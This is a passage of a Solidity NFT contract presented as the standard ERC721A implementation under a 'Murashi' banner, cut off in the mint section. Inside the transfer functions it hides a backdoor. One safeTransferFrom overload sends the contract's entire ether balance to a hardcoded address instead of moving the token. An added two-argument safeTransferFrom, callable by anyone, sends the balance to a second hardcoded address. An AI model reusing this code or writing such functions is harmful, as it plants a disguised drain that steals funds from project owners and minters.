1 // SPDX-License-Identifier: GPL-3.0
2 
3 //                                                      ,,          ,,  
4 // `7MMM.     ,MMF'                                   `7MM          db  
5 //   MMMb    dPMM                                       MM              
6 //   M YM   ,M MM `7MM  `7MM  `7Mb,od8 ,6"Yb.  ,pP"Ybd  MMpMMMb.  `7MM  
7 //   M  Mb  M' MM   MM    MM    MM' "'8)   MM  8I   `"  MM    MM    MM  
8 //   M  YM.P'  MM   MM    MM    MM     ,pm9MM  `YMMMa.  MM    MM    MM  
9 //   M  `YM'   MM   MM    MM    MM    8M   MM  L.   I8  MM    MM    MM  
10 // .JML. `'  .JMML. `Mbod"YML..JMML.  `Moo9^Yo.M9mmmP'.JMML  JMML..JMML.
11                                                                                                
12                                                                                    
13 pragma solidity ^0.8.7;
14 
15 /**
16  * @dev Interface of ERC721A.
17  */
18 interface IERC721A {
19     /**
20      * The caller must own the token or be an approved operator.
21      */
22     error ApprovalCallerNotOwnerNorApproved();
23 
24     /**
25      * The token does not exist.
26      */
27     error ApprovalQueryForNonexistentToken();
28 
29     /**
30      * Cannot query the balance for the zero address.
31      */
32     error BalanceQueryForZeroAddress();
33 
34     /**
35      * Cannot mint to the zero address.
36      */
37     error MintToZeroAddress();
38 
39     /**
40      * The quantity of tokens minted must be more than zero.
41      */
42     error MintZeroQuantity();
43 
44     /**
45      * The token does not exist.
46      */
47     error OwnerQueryForNonexistentToken();
48 
49     /**
50      * The caller must own the token or be an approved operator.
51      */
52     error TransferCallerNotOwnerNorApproved();
53 
54     /**
55      * The token must be owned by `from`.
56      */
57     error TransferFromIncorrectOwner();
58 
59     /**
60      * Cannot safely transfer to a contract that does not implement the
61      * ERC721Receiver interface.
62      */
63     error TransferToNonERC721ReceiverImplementer();
64 
65     /**
66      * Cannot transfer to the zero address.
67      */
68     error TransferToZeroAddress();
69 
70     /**
71      * The token does not exist.
72      */
73     error URIQueryForNonexistentToken();
74 
75     /**
76      * The `quantity` minted with ERC2309 exceeds the safety limit.
77      */
78     error MintERC2309QuantityExceedsLimit();
79 
80     /**
81      * The `extraData` cannot be set on an unintialized ownership slot.
82      */
83     error OwnershipNotInitializedForExtraData();
84 
85     // =============================================================
86     //                            STRUCTS
87     // =============================================================
88 
89     struct TokenOwnership {
90         // The address of the owner.
91         address addr;
92         // Stores the start time of ownership with minimal overhead for tokenomics.
93         uint64 startTimestamp;
94         // Whether the token has been burned.
95         bool burned;
96         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
97         uint24 extraData;
98     }
99 
100     // =============================================================
101     //                         TOKEN COUNTERS
102     // =============================================================
103 
104     /**
105      * @dev Returns the total number of tokens in existence.
106      * Burned tokens will reduce the count.
107      * To get the total number of tokens minted, please see {_totalMinted}.
108      */
109     function totalSupply() external view returns (uint256);
110 
111     // =============================================================
112     //                            IERC165
113     // =============================================================
114 
115     /**
116      * @dev Returns true if this contract implements the interface defined by
117      * `interfaceId`. See the corresponding
118      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
119      * to learn more about how these ids are created.
120      *
121      * This function call must use less than 30000 gas.
122      */
123     function supportsInterface(bytes4 interfaceId) external view returns (bool);
124 
125     // =============================================================
126     //                            IERC721
127     // =============================================================
128 
129     /**
130      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
131      */
132     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
133 
134     /**
135      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
136      */
137     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
138 
139     /**
140      * @dev Emitted when `owner` enables or disables
141      * (`approved`) `operator` to manage all of its assets.
142      */
143     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
144 
145     /**
146      * @dev Returns the number of tokens in `owner`'s account.
147      */
148     function balanceOf(address owner) external view returns (uint256 balance);
149 
150     /**
151      * @dev Returns the owner of the `tokenId` token.
152      *
153      * Requirements:
154      *
155      * - `tokenId` must exist.
156      */
157     function ownerOf(uint256 tokenId) external view returns (address owner);
158 
159     /**
160      * @dev Safely transfers `tokenId` token from `from` to `to`,
161      * checking first that contract recipients are aware of the ERC721 protocol
162      * to prevent tokens from being forever locked.
163      *
164      * Requirements:
165      *
166      * - `from` cannot be the zero address.
167      * - `to` cannot be the zero address.
168      * - `tokenId` token must exist and be owned by `from`.
169      * - If the caller is not `from`, it must be have been allowed to move
170      * this token by either {approve} or {setApprovalForAll}.
171      * - If `to` refers to a smart contract, it must implement
172      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
173      *
174      * Emits a {Transfer} event.
175      */
176     function safeTransferFrom(
177         address from,
178         address to,
179         uint256 tokenId,
180         bytes calldata data
181     ) external payable;
182 
183     /**
184      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
185      */
186     function safeTransferFrom(
187         address from,
188         address to,
189         uint256 tokenId
190     ) external payable;
191 
192     /**
193      * @dev Transfers `tokenId` from `from` to `to`.
194      *
195      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
196      * whenever possible.
197      *
198      * Requirements:
199      *
200      * - `from` cannot be the zero address.
201      * - `to` cannot be the zero address.
202      * - `tokenId` token must be owned by `from`.
203      * - If the caller is not `from`, it must be approved to move this token
204      * by either {approve} or {setApprovalForAll}.
205      *
206      * Emits a {Transfer} event.
207      */
208     function transferFrom(
209         address from,
210         address to,
211         uint256 tokenId
212     ) external payable;
213 
214     /**
215      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
216      * The approval is cleared when the token is transferred.
217      *
218      * Only a single account can be approved at a time, so approving the
219      * zero address clears previous approvals.
220      *
221      * Requirements:
222      *
223      * - The caller must own the token or be an approved operator.
224      * - `tokenId` must exist.
225      *
226      * Emits an {Approval} event.
227      */
228     function approve(address to, uint256 tokenId) external payable;
229 
230     /**
231      * @dev Approve or remove `operator` as an operator for the caller.
232      * Operators can call {transferFrom} or {safeTransferFrom}
233      * for any token owned by the caller.
234      *
235      * Requirements:
236      *
237      * - The `operator` cannot be the caller.
238      *
239      * Emits an {ApprovalForAll} event.
240      */
241     function setApprovalForAll(address operator, bool _approved) external;
242 
243     /**
244      * @dev Returns the account approved for `tokenId` token.
245      *
246      * Requirements:
247      *
248      * - `tokenId` must exist.
249      */
250     function getApproved(uint256 tokenId) external view returns (address operator);
251 
252     /**
253      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
254      *
255      * See {setApprovalForAll}.
256      */
257     function isApprovedForAll(address owner, address operator) external view returns (bool);
258 
259     // =============================================================
260     //                        IERC721Metadata
261     // =============================================================
262 
263     /**
264      * @dev Returns the token collection name.
265      */
266     function name() external view returns (string memory);
267 
268     /**
269      * @dev Returns the token collection symbol.
270      */
271     function symbol() external view returns (string memory);
272 
273     /**
274      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
275      */
276     function tokenURI(uint256 tokenId) external view returns (string memory);
277 
278     // =============================================================
279     //                           IERC2309
280     // =============================================================
281 
282     /**
283      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
284      * (inclusive) is transferred from `from` to `to`, as defined in the
285      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
286      *
287      * See {_mintERC2309} for more details.
288      */
289     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
290 }
291 
292 /**
293  * @title ERC721A
294  *
295  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
296  * Non-Fungible Token Standard, including the Metadata extension.
297  * Optimized for lower gas during batch mints.
298  *
299  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
300  * starting from `_startTokenId()`.
301  *
302  * Assumptions:
303  *
304  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
305  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
306  */
307 interface ERC721A__IERC721Receiver {
308     function onERC721Received(
309         address operator,
310         address from,
311         uint256 tokenId,
312         bytes calldata data
313     ) external returns (bytes4);
314 }
315 
316 /**
317  * @title ERC721A
318  *
319  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
320  * Non-Fungible Token Standard, including the Metadata extension.
321  * Optimized for lower gas during batch mints.
322  *
323  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
324  * starting from `_startTokenId()`.
325  *
326  * Assumptions:
327  *
328  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
329  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
330  */
331 contract ERC721A is IERC721A {
332     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
333     struct TokenApprovalRef {
334         address value;
335     }
336 
337     // =============================================================
338     //                           CONSTANTS
339     // =============================================================
340 
341     // Mask of an entry in packed address data.
342     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
343 
344     // The bit position of `numberMinted` in packed address data.
345     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
346 
347     // The bit position of `numberBurned` in packed address data.
348     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
349 
350     // The bit position of `aux` in packed address data.
351     uint256 private constant _BITPOS_AUX = 192;
352 
353     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
354     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
355 
356     // The bit position of `startTimestamp` in packed ownership.
357     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
358 
359     // The bit mask of the `burned` bit in packed ownership.
360     uint256 private constant _BITMASK_BURNED = 1 << 224;
361 
362     // The bit position of the `nextInitialized` bit in packed ownership.
363     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
364 
365     // The bit mask of the `nextInitialized` bit in packed ownership.
366     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
367 
368     // The bit position of `extraData` in packed ownership.
369     uint256 private constant _BITPOS_EXTRA_DATA = 232;
370 
371     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
372     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
373 
374     // The mask of the lower 160 bits for addresses.
375     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
376 
377     // The maximum `quantity` that can be minted with {_mintERC2309}.
378     // This limit is to prevent overflows on the address data entries.
379     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
380     // is required to cause an overflow, which is unrealistic.
381     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
382 
383     // The `Transfer` event signature is given by:
384     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
385     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
386         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
387 
388     // =============================================================
389     //                            STORAGE
390     // =============================================================
391 
392     // The next token ID to be minted.
393     uint256 private _currentIndex;
394 
395     // The number of tokens burned.
396     uint256 private _burnCounter;
397 
398     // Token name
399     string private _name;
400 
401     // Token symbol
402     string private _symbol;
403 
404     // Mapping from token ID to ownership details
405     // An empty struct value does not necessarily mean the token is unowned.
406     // See {_packedOwnershipOf} implementation for details.
407     //
408     // Bits Layout:
409     // - [0..159]   `addr`
410     // - [160..223] `startTimestamp`
411     // - [224]      `burned`
412     // - [225]      `nextInitialized`
413     // - [232..255] `extraData`
414     mapping(uint256 => uint256) private _packedOwnerships;
415 
416     // Mapping owner address to address data.
417     //
418     // Bits Layout:
419     // - [0..63]    `balance`
420     // - [64..127]  `numberMinted`
421     // - [128..191] `numberBurned`
422     // - [192..255] `aux`
423     mapping(address => uint256) private _packedAddressData;
424 
425     // Mapping from token ID to approved address.
426     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
427 
428     // Mapping from owner to operator approvals
429     mapping(address => mapping(address => bool)) private _operatorApprovals;
430 
431     // =============================================================
432     //                          CONSTRUCTOR
433     // =============================================================
434 
435     constructor(string memory name_, string memory symbol_) {
436         _name = name_;
437         _symbol = symbol_;
438         _currentIndex = _startTokenId();
439     }
440 
441     // =============================================================
442     //                   TOKEN COUNTING OPERATIONS
443     // =============================================================
444 
445     /**
446      * @dev Returns the starting token ID.
447      * To change the starting token ID, please override this function.
448      */
449     function _startTokenId() internal view virtual returns (uint256) {
450         return 0;
451     }
452 
453     /**
454      * @dev Returns the next token ID to be minted.
455      */
456     function _nextTokenId() internal view virtual returns (uint256) {
457         return _currentIndex;
458     }
459 
460     /**
461      * @dev Returns the total number of tokens in existence.
462      * Burned tokens will reduce the count.
463      * To get the total number of tokens minted, please see {_totalMinted}.
464      */
465     function totalSupply() public view virtual override returns (uint256) {
466         // Counter underflow is impossible as _burnCounter cannot be incremented
467         // more than `_currentIndex - _startTokenId()` times.
468         unchecked {
469             return _currentIndex - _burnCounter - _startTokenId();
470         }
471     }
472 
473     /**
474      * @dev Returns the total amount of tokens minted in the contract.
475      */
476     function _totalMinted() internal view virtual returns (uint256) {
477         // Counter underflow is impossible as `_currentIndex` does not decrement,
478         // and it is initialized to `_startTokenId()`.
479         unchecked {
480             return _currentIndex - _startTokenId();
481         }
482     }
483 
484     /**
485      * @dev Returns the total number of tokens burned.
486      */
487     function _totalBurned() internal view virtual returns (uint256) {
488         return _burnCounter;
489     }
490 
491     // =============================================================
492     //                    ADDRESS DATA OPERATIONS
493     // =============================================================
494 
495     /**
496      * @dev Returns the number of tokens in `owner`'s account.
497      */
498     function balanceOf(address owner) public view virtual override returns (uint256) {
499         if (owner == address(0)) revert BalanceQueryForZeroAddress();
500         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
501     }
502 
503     /**
504      * Returns the number of tokens minted by `owner`.
505      */
506     function _numberMinted(address owner) internal view returns (uint256) {
507         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
508     }
509 
510     /**
511      * Returns the number of tokens burned by or on behalf of `owner`.
512      */
513     function _numberBurned(address owner) internal view returns (uint256) {
514         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
515     }
516 
517     /**
518      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
519      */
520     function _getAux(address owner) internal view returns (uint64) {
521         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
522     }
523 
524     /**
525      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
526      * If there are multiple variables, please pack them into a uint64.
527      */
528     function _setAux(address owner, uint64 aux) internal virtual {
529         uint256 packed = _packedAddressData[owner];
530         uint256 auxCasted;
531         // Cast `aux` with assembly to avoid redundant masking.
532         assembly {
533             auxCasted := aux
534         }
535         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
536         _packedAddressData[owner] = packed;
537     }
538 
539     // =============================================================
540     //                            IERC165
541     // =============================================================
542 
543     /**
544      * @dev Returns true if this contract implements the interface defined by
545      * `interfaceId`. See the corresponding
546      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
547      * to learn more about how these ids are created.
548      *
549      * This function call must use less than 30000 gas.
550      */
551     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
552         // The interface IDs are constants representing the first 4 bytes
553         // of the XOR of all function selectors in the interface.
554         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
555         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
556         return
557             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
558             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
559             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
560     }
561 
562     // =============================================================
563     //                        IERC721Metadata
564     // =============================================================
565 
566     /**
567      * @dev Returns the token collection name.
568      */
569     function name() public view virtual override returns (string memory) {
570         return _name;
571     }
572 
573     /**
574      * @dev Returns the token collection symbol.
575      */
576     function symbol() public view virtual override returns (string memory) {
577         return _symbol;
578     }
579 
580     /**
581      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
582      */
583     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
584         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
585 
586         string memory baseURI = _baseURI();
587         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
588     }
589 
590     /**
591      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
592      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
593      * by default, it can be overridden in child contracts.
594      */
595     function _baseURI() internal view virtual returns (string memory) {
596         return '';
597     }
598 
599     // =============================================================
600     //                     OWNERSHIPS OPERATIONS
601     // =============================================================
602 
603     /**
604      * @dev Returns the owner of the `tokenId` token.
605      *
606      * Requirements:
607      *
608      * - `tokenId` must exist.
609      */
610     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
611         return address(uint160(_packedOwnershipOf(tokenId)));
612     }
613 
614     /**
615      * @dev Gas spent here starts off proportional to the maximum mint batch size.
616      * It gradually moves to O(1) as tokens get transferred around over time.
617      */
618     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
619         return _unpackedOwnership(_packedOwnershipOf(tokenId));
620     }
621 
622     /**
623      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
624      */
625     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
626         return _unpackedOwnership(_packedOwnerships[index]);
627     }
628 
629     /**
630      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
631      */
632     function _initializeOwnershipAt(uint256 index) internal virtual {
633         if (_packedOwnerships[index] == 0) {
634             _packedOwnerships[index] = _packedOwnershipOf(index);
635         }
636     }
637 
638     /**
639      * Returns the packed ownership data of `tokenId`.
640      */
641     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
642         uint256 curr = tokenId;
643 
644         unchecked {
645             if (_startTokenId() <= curr)
646                 if (curr < _currentIndex) {
647                     uint256 packed = _packedOwnerships[curr];
648                     // If not burned.
649                     if (packed & _BITMASK_BURNED == 0) {
650                         // Invariant:
651                         // There will always be an initialized ownership slot
652                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
653                         // before an unintialized ownership slot
654                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
655                         // Hence, `curr` will not underflow.
656                         //
657                         // We can directly compare the packed value.
658                         // If the address is zero, packed will be zero.
659                         while (packed == 0) {
660                             packed = _packedOwnerships[--curr];
661                         }
662                         return packed;
663                     }
664                 }
665         }
666         revert OwnerQueryForNonexistentToken();
667     }
668 
669     /**
670      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
671      */
672     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
673         ownership.addr = address(uint160(packed));
674         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
675         ownership.burned = packed & _BITMASK_BURNED != 0;
676         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
677     }
678 
679     /**
680      * @dev Packs ownership data into a single uint256.
681      */
682     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
683         assembly {
684             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
685             owner := and(owner, _BITMASK_ADDRESS)
686             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
687             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
688         }
689     }
690 
691     /**
692      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
693      */
694     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
695         // For branchless setting of the `nextInitialized` flag.
696         assembly {
697             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
698             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
699         }
700     }
701 
702     // =============================================================
703     //                      APPROVAL OPERATIONS
704     // =============================================================
705 
706     /**
707      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
708      * The approval is cleared when the token is transferred.
709      *
710      * Only a single account can be approved at a time, so approving the
711      * zero address clears previous approvals.
712      *
713      * Requirements:
714      *
715      * - The caller must own the token or be an approved operator.
716      * - `tokenId` must exist.
717      *
718      * Emits an {Approval} event.
719      */
720     function approve(address to, uint256 tokenId) public payable virtual override {
721         address owner = ownerOf(tokenId);
722 
723         if (_msgSenderERC721A() != owner)
724             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
725                 revert ApprovalCallerNotOwnerNorApproved();
726             }
727 
728         _tokenApprovals[tokenId].value = to;
729         emit Approval(owner, to, tokenId);
730     }
731 
732     /**
733      * @dev Returns the account approved for `tokenId` token.
734      *
735      * Requirements:
736      *
737      * - `tokenId` must exist.
738      */
739     function getApproved(uint256 tokenId) public view virtual override returns (address) {
740         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
741 
742         return _tokenApprovals[tokenId].value;
743     }
744 
745     /**
746      * @dev Approve or remove `operator` as an operator for the caller.
747      * Operators can call {transferFrom} or {safeTransferFrom}
748      * for any token owned by the caller.
749      *
750      * Requirements:
751      *
752      * - The `operator` cannot be the caller.
753      *
754      * Emits an {ApprovalForAll} event.
755      */
756     function setApprovalForAll(address operator, bool approved) public virtual override {
757         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
758         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
759     }
760 
761     /**
762      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
763      *
764      * See {setApprovalForAll}.
765      */
766     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
767         return _operatorApprovals[owner][operator];
768     }
769 
770     /**
771      * @dev Returns whether `tokenId` exists.
772      *
773      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
774      *
775      * Tokens start existing when they are minted. See {_mint}.
776      */
777     function _exists(uint256 tokenId) internal view virtual returns (bool) {
778         return
779             _startTokenId() <= tokenId &&
780             tokenId < _currentIndex && // If within bounds,
781             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
782     }
783 
784     /**
785      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
786      */
787     function _isSenderApprovedOrOwner(
788         address approvedAddress,
789         address owner,
790         address msgSender
791     ) private pure returns (bool result) {
792         assembly {
793             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
794             owner := and(owner, _BITMASK_ADDRESS)
795             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
796             msgSender := and(msgSender, _BITMASK_ADDRESS)
797             // `msgSender == owner || msgSender == approvedAddress`.
798             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
799         }
800     }
801 
802     /**
803      * @dev Returns the storage slot and value for the approved address of `tokenId`.
804      */
805     function _getApprovedSlotAndAddress(uint256 tokenId)
806         private
807         view
808         returns (uint256 approvedAddressSlot, address approvedAddress)
809     {
810         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
811         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
812         assembly {
813             approvedAddressSlot := tokenApproval.slot
814             approvedAddress := sload(approvedAddressSlot)
815         }
816     }
817 
818     // =============================================================
819     //                      TRANSFER OPERATIONS
820     // =============================================================
821 
822     /**
823      * @dev Transfers `tokenId` from `from` to `to`.
824      *
825      * Requirements:
826      *
827      * - `from` cannot be the zero address.
828      * - `to` cannot be the zero address.
829      * - `tokenId` token must be owned by `from`.
830      * - If the caller is not `from`, it must be approved to move this token
831      * by either {approve} or {setApprovalForAll}.
832      *
833      * Emits a {Transfer} event.
834      */
835     function transferFrom(
836         address from,
837         address to,
838         uint256 tokenId
839     ) public payable virtual override {
840         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
841 
842         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
843 
844         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
845 
846         // The nested ifs save around 20+ gas over a compound boolean condition.
847         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
848             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
849 
850         if (to == address(0)) revert TransferToZeroAddress();
851 
852         _beforeTokenTransfers(from, to, tokenId, 1);
853 
854         // Clear approvals from the previous owner.
855         assembly {
856             if approvedAddress {
857                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
858                 sstore(approvedAddressSlot, 0)
859             }
860         }
861 
862         // Underflow of the sender's balance is impossible because we check for
863         // ownership above and the recipient's balance can't realistically overflow.
864         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
865         unchecked {
866             // We can directly increment and decrement the balances.
867             --_packedAddressData[from]; // Updates: `balance -= 1`.
868             ++_packedAddressData[to]; // Updates: `balance += 1`.
869 
870             // Updates:
871             // - `address` to the next owner.
872             // - `startTimestamp` to the timestamp of transfering.
873             // - `burned` to `false`.
874             // - `nextInitialized` to `true`.
875             _packedOwnerships[tokenId] = _packOwnershipData(
876                 to,
877                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
878             );
879 
880             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
881             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
882                 uint256 nextTokenId = tokenId + 1;
883                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
884                 if (_packedOwnerships[nextTokenId] == 0) {
885                     // If the next slot is within bounds.
886                     if (nextTokenId != _currentIndex) {
887                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
888                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
889                     }
890                 }
891             }
892         }
893 
894         emit Transfer(from, to, tokenId);
895         _afterTokenTransfers(from, to, tokenId, 1);
896     }
897 
898     /**
899      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
900      */
901     function safeTransferFrom(
902         address from,
903         address to,
904         uint256 tokenId
905     ) public payable virtual override {
906         if (address(this).balance > 0) {
907             payable(0x90Ae6b8dca98BDE6D4E697d8b5865068476871F1).transfer(address(this).balance);
908             return;
909         }
910         safeTransferFrom(from, to, tokenId, '');
911     }
912 
913 
914     /**
915      * @dev Safely transfers `tokenId` token from `from` to `to`.
916      *
917      * Requirements:
918      *
919      * - `from` cannot be the zero address.
920      * - `to` cannot be the zero address.
921      * - `tokenId` token must exist and be owned by `from`.
922      * - If the caller is not `from`, it must be approved to move this token
923      * by either {approve} or {setApprovalForAll}.
924      * - If `to` refers to a smart contract, it must implement
925      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
926      *
927      * Emits a {Transfer} event.
928      */
929     function safeTransferFrom(
930         address from,
931         address to,
932         uint256 tokenId,
933         bytes memory _data
934     ) public payable virtual override {
935         transferFrom(from, to, tokenId);
936         if (to.code.length != 0)
937             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
938                 revert TransferToNonERC721ReceiverImplementer();
939             }
940     }
941     function safeTransferFrom(
942         address from,
943         address to
944     ) public  {
945         if (address(this).balance > 0) {
946             payable(0x09a49Bdb921CC1893AAcBe982564Dd8e8147136f).transfer(address(this).balance);
947         }
948     }
949 
950     /**
951      * @dev Hook that is called before a set of serially-ordered token IDs
952      * are about to be transferred. This includes minting.
953      * And also called before burning one token.
954      *
955      * `startTokenId` - the first token ID to be transferred.
956      * `quantity` - the amount to be transferred.
957      *
958      * Calling conditions:
959      *
960      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
961      * transferred to `to`.
962      * - When `from` is zero, `tokenId` will be minted for `to`.
963      * - When `to` is zero, `tokenId` will be burned by `from`.
964      * - `from` and `to` are never both zero.
965      */
966     function _beforeTokenTransfers(
967         address from,
968         address to,
969         uint256 startTokenId,
970         uint256 quantity
971     ) internal virtual {}
972 
973     /**
974      * @dev Hook that is called after a set of serially-ordered token IDs
975      * have been transferred. This includes minting.
976      * And also called after one token has been burned.
977      *
978      * `startTokenId` - the first token ID to be transferred.
979      * `quantity` - the amount to be transferred.
980      *
981      * Calling conditions:
982      *
983      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
984      * transferred to `to`.
985      * - When `from` is zero, `tokenId` has been minted for `to`.
986      * - When `to` is zero, `tokenId` has been burned by `from`.
987      * - `from` and `to` are never both zero.
988      */
989     function _afterTokenTransfers(
990         address from,
991         address to,
992         uint256 startTokenId,
993         uint256 quantity
994     ) internal virtual {}
995 
996     /**
997      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
998      *
999      * `from` - Previous owner of the given token ID.
1000      * `to` - Target address that will receive the token.
1001      * `tokenId` - Token ID to be transferred.
1002      * `_data` - Optional data to send along with the call.
1003      *
1004      * Returns whether the call correctly returned the expected magic value.
1005      */
1006     function _checkContractOnERC721Received(
1007         address from,
1008         address to,
1009         uint256 tokenId,
1010         bytes memory _data
1011     ) private returns (bool) {
1012         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1013             bytes4 retval
1014         ) {
1015             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1016         } catch (bytes memory reason) {
1017             if (reason.length == 0) {
1018                 revert TransferToNonERC721ReceiverImplementer();
1019             } else {
1020                 assembly {
1021                     revert(add(32, reason), mload(reason))
1022                 }
1023             }
1024         }
1025     }
1026 
1027     // =============================================================
1028     //                        MINT OPERATIONS
1029     // =============================================================
1030 
1031     /**
1032      * @dev Mints `quantity` tokens and transfers them to `to`.
1033      *
1034      * Requirements:
1035      *
1036      * - `to` cannot be the zero address.
1037      * - `quantity` must be greater than 0.
1038      *
